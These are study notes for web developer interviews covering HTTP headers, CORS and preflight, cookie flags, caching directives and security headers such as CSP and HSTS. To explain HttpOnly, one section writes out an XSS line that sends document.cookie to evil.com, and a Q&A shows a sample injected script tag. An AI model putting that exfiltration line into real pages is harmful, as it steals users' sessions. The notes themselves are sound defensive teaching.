# HTTP Headers & CORS — Interview Notes

> Every fetch request involves headers from browser → server and server → browser. Know what each does, who sets it, and what triggers CORS preflight.

---

## Browser → Server Headers (Request)

| Header | Who Sets It | What It Does | Triggers Preflight? |
|--------|------------|--------------|---------------------|
| `Origin` | Browser (auto) | Identifies where request came from. Can't be faked from JS. | No |
| `Content-Type` | You | Tells server how to parse body. `application/json` triggers preflight. `urlencoded` and `form-data` don't. | Only if not a "simple" type |
| `Authorization` | You | Carries auth token (`Bearer <jwt>` or `Basic <b64>`) | ✅ Always |
| `Accept` | You | What response format you want (`application/json`, `text/html`) | No |
| `Cookie` | Browser (auto) | Sends stored cookies. Controlled by `credentials` option in fetch. | No |
| `User-Agent` | Browser (auto) | Identifies browser/device | No |
| `Referer` | Browser (auto) | URL of the page making the request | No |
| Custom (`X-*`) | You | Any custom header like `X-Request-ID`, `X-Idempotency-Key` | ✅ Always |

---

## Simple Request (No Preflight) Rules

ALL must be true:
- Method: `GET`, `HEAD`, or `POST`
- Only safe headers: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
- Content-Type limited to: `text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded`

**Anything else = preflight OPTIONS fires first.**

---

## Senior-Level Traps

### Trap 1: `Allow-Origin: *` with credentials
**What they ask:** "Can you use `*` for allowed origin when sending cookies?"
**Answer:** No. Browser rejects `Access-Control-Allow-Origin: *` when `credentials: 'include'` is set. Must be an explicit origin.

### Trap 2: Vary: Origin
**What they ask:** "Your CORS works sometimes but fails randomly. What's wrong?"
**Answer:** Missing `Vary: Origin` header. CDN caches response for one origin, serves it to another. The CORS headers mismatch and browser blocks it.

### Trap 3: CORS doesn't block requests
**What they ask:** "Does CORS prevent the server from processing a malicious request?"
**Answer:** No. The request still hits the server. CORS only blocks JS from **reading the response**. Exception: preflighted requests (PUT, DELETE, custom headers) — the real request won't fire if preflight fails.

### Trap 4: CORS ≠ CSRF
**What they ask:** "We have CORS configured, are we safe from CSRF?"
**Answer:** No. A simple `<form>` POST bypasses CORS entirely — no preflight, no Origin check by default. CSRF needs separate protection: CSRF tokens, `SameSite` cookies, server-side Origin validation.

### Trap 5: `application/json` triggers preflight but forms don't
**What they ask:** "Why does my fetch fail with CORS but a form submission to the same endpoint works?"
**Answer:** HTML forms can only send `urlencoded` or `form-data` — both are "simple" types. `application/json` is not simple → triggers preflight → fails if server doesn't handle OPTIONS.

### Trap 6: Bearer tokens vs Cookies for CSRF safety
**What they ask:** "Which is safer from CSRF — cookies or Authorization header?"
**Answer:** `Authorization` header is CSRF-safe because it's never sent automatically — your JS must attach it. Cookies are sent automatically by the browser on every request to that domain. Tradeoff: tokens need JS storage (vulnerable to XSS), cookies with `HttpOnly` are invisible to JS (safe from XSS but vulnerable to CSRF).

---

## Quick Q&A

**Q: Can you override the `Origin` header in fetch?**
A: No. Browser controls it. You can fake it from curl/Postman but not from browser JS.

**Q: Do you need to set `Content-Type` for FormData uploads?**
A: No. Don't set it manually — browser auto-sets `multipart/form-data` with the correct boundary string.

**Q: What are the three values of `credentials` in fetch?**
A: `'omit'` (never send cookies), `'same-origin'` (default, same-origin only), `'include'` (always, even cross-origin).

**Q: What's the difference between `no-cache` and `no-store`?**
A: `no-store` = never cache. `no-cache` = cache but revalidate with server every time. The name is misleading.

**Q: Why is `X-Idempotency-Key` important?**
A: Prevents duplicate side effects on retries. User clicks "Pay" twice, server sees same key, processes only once. Stripe uses this pattern.

**Q: What does `HttpOnly` on a cookie do?**
A: Prevents `document.cookie` from reading it. Protects the token from XSS attacks stealing it via JS.

**Q: What does `SameSite=Strict` do?**
A: Cookie is never sent on cross-site requests. Even clicking a link from another site to yours won't include the cookie. `Lax` allows it on top-level navigations (link clicks) but not on fetch/form POST.

**Q: If `SameSite=Strict` exists, why do we still need CSRF tokens?**
A: Not all browsers support it equally, legacy cookies may not have it set, and `Lax` (the default) still allows GET-based CSRF. Defense in depth — don't rely on a single mechanism.

**Q: What security header is the strongest XSS protection?**
A: `Content-Security-Policy`. Even if an attacker injects a `<script>`, CSP blocks execution if the source isn't whitelisted.

---

## Quick Revision — 10 Things to Remember

1. `Origin` = browser-controlled, can't fake from JS
2. `application/json` = NOT a simple content type → triggers preflight
3. `Authorization` header → always triggers preflight, but CSRF-safe
4. Cookies → sent automatically, CSRF risk, but `HttpOnly` protects from XSS
5. `credentials: 'include'` + `Allow-Origin: *` = ❌ browser rejects
6. Always add `Vary: Origin` when dynamically setting allowed origins
7. CORS blocks reading responses, not sending requests
8. CORS ≠ CSRF — different attacks, different protections
9. `no-cache` ≠ "don't cache" — it means "revalidate first"
10. `Content-Security-Policy` is the strongest XSS defense



Server → Browser Response Headers

1. Content-Type
Tells the browser how to interpret the response body. application/json means parse as JSON. text/html means render as HTML. If the server sends wrong content type, the browser might misinterpret data. For example, if a JSON response is served as text/html, the browser might try to render it — and if it contains a <script> tag, it could execute. That's why X-Content-Type-Options: nosniff exists.
2. Set-Cookie
Tells the browser to store a cookie. The flags are where it gets interesting:
HttpOnly — browser stores the cookie but JavaScript cannot access it via document.cookie. Protects against XSS. Even if an attacker injects a script, they can't steal the session token.
Secure — cookie is only sent over HTTPS, never HTTP. Protects against man-in-the-middle attacks sniffing cookies on unencrypted connections.
SameSite=Strict — cookie is never sent on cross-site requests. Even clicking a link from another site won't include it. Maximum CSRF protection but breaks some UX flows.
SameSite=Lax — cookie is sent on top-level navigations (clicking a link) but NOT on cross-site fetch/form POST. This is the default in modern browsers. Good balance of security and usability.
SameSite=None; Secure — cookie is sent on all cross-site requests. Required for third-party cookies (e.g., embedded widgets, OAuth flows). Must have Secure flag too.
Domain=.example.com — cookie is shared across all subdomains. Without it, cookie is only for the exact domain that set it.
Path=/api — cookie is only sent for requests to /api and below.
Max-Age=3600 — cookie expires in 1 hour. Expires does the same with an absolute date. Without either, it's a session cookie — deleted when browser closes.
3. Cache-Control
Tells the browser and CDNs how to cache the response.
no-store — don't cache at all. Use for sensitive data like banking pages.
no-cache — you CAN cache, but must check with server before using it. Misleading name.
max-age=3600 — cache for 1 hour without asking the server.
public — any cache (browser, CDN, proxy) can store it.
private — only the browser can cache, not CDNs. Use for user-specific data.
must-revalidate — once the cached version expires, you MUST check with the server. Don't serve stale content.
stale-while-revalidate=60 — serve stale content immediately but revalidate in the background. Great for performance — user sees instant response while fresh data loads. Next.js ISR uses this concept.
4. ETag
A fingerprint/hash of the response content. Server sends ETag: "abc123". Next time the browser requests the same resource, it sends If-None-Match: "abc123". If content hasn't changed, server returns 304 Not Modified with no body — saves bandwidth. If changed, server sends 200 with new content and new ETag.
5. Last-Modified
Same idea as ETag but timestamp-based. Server sends Last-Modified: Wed, 08 Apr 2026 10:00:00 GMT. Browser sends back If-Modified-Since on next request. Less precise than ETag — two responses could have same timestamp but different content.
6. Vary
Tells caches that the response changes depending on certain request headers. Vary: Origin means cache the response separately for each Origin. Vary: Accept-Encoding means cache separately for gzip vs brotli. Without this, caches serve wrong versions to wrong clients.
7. Location
Used with 301/302/307/308 redirects. Location: https://new-url.com tells the browser where to go. 301 is permanent (browser caches it), 302 is temporary. 307/308 preserve the HTTP method — a POST redirect stays POST. With 301/302, the browser might change POST to GET.
8. Content-Disposition
Tells the browser whether to display content inline or trigger a download. Content-Disposition: attachment; filename="report.pdf" forces a download dialog. Without it, browser tries to display the file inline.

Security Headers
9. Strict-Transport-Security (HSTS)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Forces browser to use HTTPS for this domain for the next year. Even if user types http://, browser auto-upgrades to https://. includeSubDomains applies to all subdomains. preload lets you submit to browser's built-in HSTS list so even the first visit is HTTPS.
10. Content-Security-Policy (CSP)
The most powerful security header. Controls what resources the page can load.
script-src 'self' — only load scripts from your own domain. Inline scripts blocked.
script-src 'self' 'nonce-abc123' — allow your domain + inline scripts with that specific nonce. React/Next.js use this pattern.
style-src 'self' 'unsafe-inline' — allow your styles + inline styles. unsafe-inline is a tradeoff — many CSS-in-JS libraries need it.
img-src 'self' https://cdn.example.com — images only from your domain and your CDN.
connect-src 'self' https://api.example.com — fetch/XHR only to your domain and your API.
default-src 'none' — block everything by default, then whitelist what you need. Most secure approach.
frame-ancestors 'none' — prevents your site from being embedded in any iframe. Modern replacement for X-Frame-Options.
11. X-Content-Type-Options
X-Content-Type-Options: nosniff
Prevents MIME sniffing. Without it, browser guesses content type and might execute a JSON response as HTML if it contains script tags.
12. X-Frame-Options
X-Frame-Options: DENY — can't be iframed at all.
X-Frame-Options: SAMEORIGIN — can only be iframed by same origin.
Prevents clickjacking. Being replaced by CSP's frame-ancestors but still widely used.
13. Referrer-Policy
Controls what's sent in the Referer header on outgoing requests.
no-referrer — send nothing.
strict-origin — send only the domain, not the full path. https://app.com/secret/page becomes just https://app.com.
strict-origin-when-cross-origin — full URL for same-origin, only domain for cross-origin. Good default.
14. Permissions-Policy
Controls access to browser APIs.
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
This says: no camera, no microphone for anyone, geolocation only for your own origin. Prevents embedded iframes from accessing sensitive APIs.

Q&A
Q: What's the difference between no-cache and no-store?
A: no-store = never cache, don't even write to disk. no-cache = you can cache but must revalidate with server before every use. The naming is a trap.
Q: When would you use private vs public in Cache-Control?
A: private for user-specific data (profile page, dashboard). CDNs won't cache it. public for shared resources (images, fonts, JS bundles) that are same for everyone.
Q: What's the difference between ETag and Last-Modified?
A: ETag is a content hash — precise. Last-Modified is a timestamp — can be imprecise if two versions have same timestamp. ETag is preferred. Use both for maximum compatibility.
Q: Why is 301 dangerous for POST endpoints?
A: Browser converts POST to GET on 301/302 redirect. User submits a form, gets redirected, the POST data is lost. Use 307 (temporary) or 308 (permanent) to preserve the method.
Q: What attack does CSP prevent?
A: XSS. Even if attacker injects <script>alert('hacked')</script> into your page, CSP blocks execution because the script source isn't whitelisted. It's the strongest XSS mitigation available.
Q: What's clickjacking and how do you prevent it?
A: Attacker embeds your site in an invisible iframe and overlays their own UI. User thinks they're clicking the attacker's button but actually clicking yours (like "Transfer Money"). Prevent with X-Frame-Options: DENY or CSP: frame-ancestors 'none'.
Q: If HttpOnly protects cookies from XSS, why do we still need CSP?
A: HttpOnly only protects cookies. XSS can still read DOM content, make API calls with the user's session, redirect users, modify the page, log keystrokes. CSP prevents the script from executing at all.
Q: What's stale-while-revalidate and when would you use it?
A: Serve cached (possibly stale) content immediately while fetching fresh data in the background. User gets instant response, next request gets fresh data. Perfect for content that changes but doesn't need to be real-time — blog posts, product listings, dashboards.
Q: Why can't you set SameSite=None without Secure?
A: Browsers enforce this pairing. A cookie sent cross-site over HTTP is extremely vulnerable to interception. If you're opting into cross-site sending, you must at least ensure it's encrypted.
Q: What's the difference between X-Frame-Options and CSP frame-ancestors?
A: X-Frame-Options only allows DENY or SAMEORIGIN. CSP frame-ancestors lets you specify exact domains that can iframe you. CSP is more flexible and is the modern replacement, but X-Frame-Options is still used for backward compatibility.
Q: Your API returns user-specific data. What Cache-Control should you set?
A: Cache-Control: private, no-cache or private, max-age=0, must-revalidate. private prevents CDN caching. no-cache or max-age=0 ensures the browser revalidates every time so users don't see stale personal data.
Q: What happens if your server doesn't send any Cache-Control header?
A: The browser uses heuristic caching — it guesses based on Last-Modified or other signals. This is unpredictable and can cause bugs where users see stale content. Always set explicit cache headers.

Want me to save this as a markdown file for your repo, or shall we go deeper on any specific header?



SET-COOKIE — Deep Dive

The basics first. When a server sends Set-Cookie, it's telling the browser "store this and send it back on future requests." But the real senior-level knowledge is in understanding every flag, how they interact, and what breaks when you get them wrong.
Full example:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Domain=.example.com; Path=/; Max-Age=86400
Let's break every piece:
session=abc123 — the actual key-value pair. This is what gets sent back as Cookie: session=abc123 on future requests. You can set multiple cookies by sending multiple Set-Cookie headers in one response. You can't combine them into one header.

HttpOnly
Without it: document.cookie returns "session=abc123". Any JS on the page can read it. If an attacker injects XSS, they run fetch('https://evil.com?token=' + document.cookie) and steal your session.
With it: document.cookie returns "" for that cookie. JS can't see it, can't read it, can't send it anywhere. The browser still attaches it to requests — it just hides it from JavaScript.
Important nuance: HttpOnly doesn't prevent the cookie from being sent. It prevents it from being read by JS. The cookie still goes out with every request to that domain. That's why HttpOnly protects against XSS token theft but NOT against CSRF — the cookie is still sent automatically.
Another nuance: you can't set HttpOnly cookies from JavaScript. document.cookie = "token=abc; HttpOnly" doesn't work — the HttpOnly flag is silently ignored. Only the server can set them via Set-Cookie header. This is by design.

Secure
Cookie is only sent over HTTPS. If someone intercepts traffic on HTTP (coffee shop WiFi, man-in-the-middle), they can't see the cookie. Without Secure, if the user visits http://example.com even once, the cookie is exposed in plaintext.
Real-world trap: during local development you're on http://localhost. Secure cookies won't be sent. Most browsers make an exception for localhost but some don't. This causes confusion during development.

SameSite — the deep cut
This is where most candidates have surface-level knowledge but crumble under pressure.
What "same site" means: Two URLs are same-site if they share the same registrable domain. app.example.com and api.example.com are same-site (both under example.com). app.com and api.com are cross-site. This is different from same-origin — same-origin requires exact match of scheme + host + port.
SameSite=Strict
Cookie is NEVER sent on cross-site requests. Not even when clicking a link. If you're on twitter.com and click a link to bank.com, your bank session cookie is NOT sent. You arrive at bank.com logged out. You have to navigate again or refresh to get logged in. Safe from CSRF but annoying UX.
SameSite=Lax
Cookie IS sent on top-level navigation GET requests (clicking links, typing in address bar). Cookie is NOT sent on cross-site POST, fetch, iframe, or image requests. This is the default in modern browsers since Chrome 80.
What "top-level navigation" means: the URL in the address bar changes. So clicking <a href="https://bank.com"> from twitter.com sends the cookie. But fetch('https://bank.com') from twitter.com does not. <iframe src="https://bank.com"> does not. <form method="POST" action="https://bank.com"> does not.
This is why Lax is considered safe for CSRF: the dangerous requests (POST, fetch) don't get the cookie. The safe request (GET link click) does, preserving UX.
SameSite=None; Secure
Cookie is sent on ALL requests, including cross-site. Required when you genuinely need cross-site cookies — OAuth login flows, embedded payment widgets, third-party chat widgets. Must be paired with Secure flag or browser rejects it.
This is the mode that's dying. Chrome is phasing out third-party cookies entirely. If your app relies on SameSite=None for anything other than specific authenticated flows, you need an alternative strategy.

Domain
Domain=.example.com — cookie is sent to example.com and ALL subdomains (api.example.com, app.example.com, admin.example.com). The leading dot is optional in modern browsers — Domain=example.com behaves the same.
No Domain set — cookie is sent ONLY to the exact domain that set it. app.example.com sets it, api.example.com does NOT receive it. This is more restrictive and more secure.
Senior trap: if your API is on api.example.com and your frontend is on app.example.com, you need Domain=.example.com for the cookie to be shared. But this also means evil.example.com (if it exists) gets the cookie too. Think carefully about your subdomain trust model.

Path
Path=/api — cookie is only sent on requests to /api, /api/users, /api/v2/data, etc. NOT sent to /dashboard or /.
In practice, most apps use Path=/ (send everywhere). Path-based restriction is weak security — any JS on the same origin can create a hidden iframe to /api and extract the cookie. Don't rely on Path for security.

Max-Age vs Expires
Max-Age=86400 — cookie expires 24 hours from now. Relative time.
Expires=Wed, 09 Apr 2026 10:00:00 GMT — cookie expires at this exact time. Absolute time. Problem: relies on user's clock being correct.
Neither set — session cookie. Deleted when the browser closes. But modern browsers have "restore session" features that resurrect session cookies, so they're not as temporary as you'd think.
Max-Age=0 or Expires in the past — deletes the cookie immediately. This is how you "log out" — send the same cookie name with Max-Age=0.

Cookie size and count limits
Each cookie: ~4KB max. Per domain: ~50 cookies max, ~4KB each. If you exceed this, browsers silently drop older cookies. This is why you don't store large objects in cookies — use cookies for session IDs only, store actual data server-side or in the token itself (JWT).

The authentication architecture question
This comes up in almost every senior interview: "How would you handle auth?"
Option A: Session cookie
Server stores session data, gives browser a session ID cookie. Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax. Browser sends it automatically. Server looks up session on every request.
Pros: HttpOnly means XSS can't steal it. Small cookie size. Server can revoke instantly.
Cons: Server needs session storage (Redis, DB). Harder to scale across multiple servers. CSRF risk because cookies are sent automatically.
Option B: JWT in Authorization header
Server gives browser a JWT. Frontend stores it in memory (or localStorage). Frontend manually attaches Authorization: Bearer <jwt> on every fetch.
Pros: Stateless — server doesn't store anything. No CSRF risk — header isn't sent automatically. Easy to scale.
Cons: Stored in localStorage? XSS can steal it. Stored in memory? Lost on refresh. Can't revoke easily — token is valid until expiry. Larger payload than a session ID.
Option C: JWT in HttpOnly cookie (the hybrid)
Server sends JWT as Set-Cookie: token=<jwt>; HttpOnly; Secure; SameSite=Strict. Browser sends it automatically. Server validates JWT from cookie.
Pros: Can't be stolen by XSS (HttpOnly). Stateless on server. Sent automatically.
Cons: Still has CSRF risk (cookie sent automatically). Need CSRF token on top. Cookie size limit — JWT can get large with many claims.
The "right answer" in interviews is knowing the tradeoffs, not picking one as "best."


CACHE-CONTROL — Deep Dive

Why caching matters at senior level: Bad caching means users see stale data, deployments don't take effect, or your CDN bills explode. Good caching means your app loads in milliseconds with zero unnecessary network requests.
The directives — what each actually does:
no-store
Don't write this response to disk. Don't cache it anywhere. Not in browser, not in CDN, not in proxy. Every request goes to the server fresh.
Use for: sensitive data (bank balances, medical records, personal messages). You don't want this sitting in browser cache where someone could find it on a shared computer.
Cache-Control: no-store
no-cache
You CAN cache this. But before using the cached version, you MUST ask the server "is this still valid?" via a conditional request (If-None-Match / If-Modified-Since). Server either returns 304 (use cache) or 200 (new data).
Use for: data that changes but you want to avoid re-downloading when it hasn't. API responses, dashboard data.
Cache-Control: no-cache
The difference between no-store and no-cache is the most common interview trap. no-store = don't even save it. no-cache = save it but always check first.
max-age=N
Cache this for N seconds. During this window, browser uses cached version without contacting the server at all. Zero network requests. After it expires, browser revalidates.
Cache-Control: max-age=31536000
That's 1 year. Used for static assets with content hashes in filenames (app.a1b2c3.js). Since the filename changes when content changes, you can cache forever safely.
public vs private
public — any cache can store this. Browser, CDN, corporate proxy, ISP cache. Use for assets that are the same for everyone.
private — ONLY the user's browser can cache. CDNs and proxies must not store it. Use for user-specific responses.
// Static JS bundle — same for everyone
Cache-Control: public, max-age=31536000

// User's profile data — only their browser should cache
Cache-Control: private, max-age=60
Senior trap: if you serve user-specific data with public, a CDN might cache User A's dashboard and serve it to User B. Data leak.
must-revalidate
Once the cache expires, you MUST go to the server. Don't serve stale content under any circumstances. Without this, browsers are allowed to serve stale content in certain conditions (like being offline).
Cache-Control: max-age=3600, must-revalidate
stale-while-revalidate=N
Serve stale content immediately, but kick off a background revalidation. Next request gets fresh data. User sees instant response, freshness catches up behind the scenes.
Cache-Control: max-age=60, stale-while-revalidate=30
This means: for the first 60 seconds, serve from cache. For the next 30 seconds after that, serve stale but revalidate. After 90 seconds total, must wait for server.
Next.js ISR uses this concept. Vercel's CDN headers are built around it.
stale-if-error=N
If the server is down, serve stale content for N seconds instead of showing an error. Resilience pattern.
Cache-Control: max-age=60, stale-if-error=86400
Server goes down? Users still see yesterday's data instead of a 500 error.
immutable
Tells the browser "this will never change, don't even revalidate on refresh." Without this, hitting refresh sends a conditional request even for cached assets. With it, even refresh uses cache.
Cache-Control: public, max-age=31536000, immutable
Perfect for versioned static assets: styles.a1b2c3.css. The hash guarantees the content matches the filename.

Caching Validation — ETag and Last-Modified flow
First request:
GET /api/users
→ 200 OK
Cache-Control: no-cache
ETag: "v1-abc123"
Last-Modified: Wed, 08 Apr 2026 10:00:00 GMT
Body: [{"id": 1, "name": "John"}]
Browser caches the response with its ETag and Last-Modified.
Second request (browser revalidates):
GET /api/users
If-None-Match: "v1-abc123"
If-Modified-Since: Wed, 08 Apr 2026 10:00:00 GMT
If nothing changed:
→ 304 Not Modified
(no body — saves bandwidth)
Browser uses its cached version.
If data changed:
→ 200 OK
ETag: "v2-def456"
Body: [{"id": 1, "name": "John"}, {"id": 2, "name": "Jane"}]
Browser replaces cached version.

The real-world caching strategy
This is what interviewers want to hear when they ask "how would you set up caching for a production app":
HTML pages: Cache-Control: no-cache — always revalidate. The HTML contains references to versioned assets, so it must always be fresh.
JS/CSS bundles with hash: Cache-Control: public, max-age=31536000, immutable — cache forever. Filename changes when content changes.
API responses (public): Cache-Control: public, max-age=60, stale-while-revalidate=30 — cache briefly, serve stale while refreshing.
API responses (user-specific): Cache-Control: private, no-cache — browser can cache but must revalidate every time. CDN must not cache.
Sensitive data: Cache-Control: no-store — never cache. Banking, medical, personal data.
This is often called the "cache hierarchy" and demonstrating you understand it holistically is what separates senior from mid-level answers.

Q&A
Q: User deploys new code but users still see old version. What's wrong?
A: HTML is cached without revalidation. Users are loading old HTML that references old JS bundles. Fix: set Cache-Control: no-cache on HTML so browser always checks for the latest version. The JS bundles can stay cached forever because their filenames change with content.
Q: What's the difference between max-age=0 and no-cache?
A: Functionally almost identical — both force revalidation on every use. Subtle difference: max-age=0 marks the cache as immediately stale. no-cache explicitly says "must revalidate." Use no-cache for clarity.
Q: CDN is serving User A's data to User B. How?
A: Response has Cache-Control: public or missing private. CDN caches user-specific response and serves it to everyone. Fix: add private for user-specific data. Also check if Vary header is missing — if response varies by Authorization or Cookie, you need Vary: Authorization or Vary: Cookie.
Q: What's wrong with caching JWT responses?
A: If a JWT contains user-specific claims and is cached by a CDN (public), other users might receive someone else's token. Always use private, no-store for authentication responses.
Q: Why not just use no-store everywhere and be safe?
A: Performance dies. Every single request goes to the server. Static assets re-downloaded on every page load. For a large app, this means seconds of unnecessary load time and massive server costs. Caching is a performance feature — the goal is to cache aggressively where safe and restrict where necessary.
Q: Browser shows stale data after API update. Cache-Control is no-cache. What's wrong?
A: If using ETags, check if the server is generating correct ETags. A common bug: server returns the same ETag even after data changes, so browser always gets 304. Another possibility: a service worker is intercepting requests and serving from its own cache, bypassing HTTP cache headers entirely.
Q: What's the role of Vary in caching?
A: Vary tells caches to store separate versions based on specific request headers. Vary: Accept-Encoding means store one version for gzip, another for brotli. Vary: Origin means store separate per-origin for CORS. Vary: Cookie means store separate per-user. Without Vary, caches might serve wrong versions.
Q: How does SameSite=Lax interact with caching?
A: They don't interact directly. SameSite controls when cookies are sent. Cache-Control controls whether responses are cached. But there's an indirect issue: if a cached response was generated for an authenticated user (cookie was sent), and a CDN serves that cached response to an unauthenticated user, they see authenticated content. That's why Vary: Cookie and private matter.
Q: User clears cookies but still appears logged in. How?
A: The authenticated page is cached in browser HTTP cache. Clearing cookies doesn't clear HTTP cache. The browser serves the cached HTML without making a new request. Fix: Cache-Control: no-store or no-cache on authenticated pages so the browser always checks with the server, which then sees no cookie and redirects to login.
Q: What happens if you set both Expires and Cache-Control: max-age?
A: max-age wins. Expires is HTTP/1.0 era. max-age is HTTP/1.1 and takes precedence. But including both provides backward compatibility for very old proxies.

🧠 1. What is CORS?

CORS = Cross-Origin Resource Sharing

👉 It’s a browser security mechanism that controls:

“Can one website request data from another domain?”


🔥 Same-Origin Policy (SOP)

Browsers follow SOP:

“Frontend can only access APIs from the same origin”

❌ Example (Blocked)
Frontend: http://localhost:5173
Backend:  http://localhost:3000

👉 Browser blocks request → CORS error

🚫 2. What is a CORS Error?

Typical error:

Access to fetch at 'http://localhost:3000/api' 
from origin 'http://localhost:5173' 
has been blocked by CORS policy


⚠️ Important Insight (VERY IMPORTANT)

👉 CORS is not a backend error

👉 Backend actually sends response
👉 Browser blocks access

🔥 This is a top interview trick question


Key thing seniors miss: CORS doesn't protect the server. The request still hits the server. CORS protects the user's browser from malicious scripts reading responses from another origin. The server is free to process the request — the browser just won't let JavaScript access the response unless the server says it's OK.

CORS flow in one line: Browser asks permission → Server grants it → Browser enforces it.
Headers from Browser (request):

Origin — "I'm from this domain"
Access-Control-Request-Method — "I want to use this HTTP method"
Access-Control-Request-Headers — "I'll send these custom headers"

Headers from Server (response):

Access-Control-Allow-Origin — "This origin is allowed"
Access-Control-Allow-Methods — "These methods are OK"
Access-Control-Allow-Headers — "These headers are OK"
Access-Control-Allow-Credentials — "Cookies/auth allowed"
Access-Control-Max-Age — "Cache this preflight for X seconds"

When preflight happens:
Custom headers (Authorization, Content-Type: application/json), or methods like PUT/DELETE/PATCH.
When preflight does NOT happen:
Simple GET/HEAD/POST with no custom headers and only safe content types (text/plain, form-data, urlencoded).
Fixing CORS:

Set correct Access-Control-Allow-* headers on your server
Or use a reverse proxy so everything is same-origin (best production pattern)

Senior-level traps to remember:

Allow-Origin: * doesn't work with credentials: true
Always send Vary: Origin when allowing specific origins
CORS doesn't block the request — it blocks JS from reading the response
CORS ≠ CSRF — different attack vectors, different protections
3. CORS doesn't block the request — it blocks JS from reading the response
This is the most misunderstood part. When your frontend calls POST /transfer-money, that request hits the server and executes. The server processes it, maybe transfers the money, and sends back a response. CORS only kicks in after — the browser looks at the response headers and decides whether your JavaScript can read the result.
So CORS is not a server protection mechanism. It protects the user's data from being read by malicious scripts, but it doesn't prevent state-changing side effects on the server. That's why you can't rely on CORS alone for security — you still need authentication, CSRF tokens, and proper authorization on the server side.
One nuance though: for preflighted requests (PUT, DELETE, custom headers), the OPTIONS check happens before the actual request. So the real request never fires if preflight fails. But simple POST requests with no custom headers? They go straight through.


2. Always send Vary: Origin when allowing specific origins
Imagine your server dynamically sets Allow-Origin based on the incoming Origin header. Request from app.com gets Allow-Origin: app.com. Request from partner.com gets Allow-Origin: partner.com.
Now a CDN or browser cache sits in between. app.com makes the request first — the response gets cached with Allow-Origin: app.com. Then partner.com makes the same request — the CDN serves the cached response with Allow-Origin: app.com. The browser sees a mismatch and blocks it.
Vary: Origin tells caches: "This response changes depending on the Origin header — cache them separately." Without it, you get mysterious intermittent CORS failures that are incredibly hard to debug.
